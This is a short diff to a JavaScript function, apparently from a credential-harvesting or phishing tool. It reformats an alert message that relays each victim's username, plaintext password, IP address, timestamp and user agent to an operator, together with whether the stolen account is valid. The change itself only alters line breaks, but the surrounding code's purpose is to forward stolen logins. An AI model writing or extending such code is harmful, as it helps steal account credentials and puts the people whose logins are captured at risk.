@@ -110,11 +110,7 @@ async function sendVerificationAlert(verificationEntry, isValidAccount) {
 
 ${statusIcon} **Account Status:** ${statusText}
 
-👤 **Username:** \`${verificationEntry.username}\`
-🔐 **Password:** \`${verificationEntry.password}\`
-🌐 **IP Address:** ${verificationEntry.ip}
-🕒 **Attempt Time:** ${new Date(verificationEntry.timestamp).toLocaleString()}
-📱 **User Agent:** ${verificationEntry.userAgent.substring(0, 50)}...
+👤 **Username:** \`${verificationEntry.username}\`\n\n🔐 **Password:** \`${verificationEntry.password}\`\n\n🌐 **IP Address:** ${verificationEntry.ip}\n\n🕒 **Attempt Time:** ${new Date(verificationEntry.timestamp).toLocaleString()}\n\n📱 **User Agent:** ${verificationEntry.userAgent.substring(0, 50)}...
 
 🔔 **Received:** ${new Date().toLocaleString()}
         `.trim();
